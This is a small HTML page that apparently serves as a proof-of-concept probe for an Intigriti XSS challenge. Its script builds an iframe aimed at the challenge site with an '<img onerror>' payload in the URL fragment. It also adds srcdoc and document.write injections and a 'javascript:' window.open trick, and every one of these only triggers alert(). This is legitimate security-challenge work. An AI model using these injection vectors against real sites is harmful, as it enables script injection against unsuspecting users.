<html>

<body>
  <script>
    window.history.go(-1);
    window.history.back();
    var iframe = document.createElement('iframe');
    iframe.name = 'helloworld';
    iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#<img src=x onerror=alert(0)>'
    iframe.srcdoc = '<img src=x onerror=alert(1)>'
//     iframe.sandbox = 'allow-popups allow-forms allow-same-origin allow-scripts allow-top-navigation allow-popups-to-escape-sandbox'
    iframe.onclick = function(e){
        var myWindow = window.open(this.contentWindow.name, 'javascript:alert(2)');
        myWindow.opener.document.write('<img src=x onerror=alert(3)>')
    }
    document.body.appendChild(iframe);
  </script>
</body>

</html>
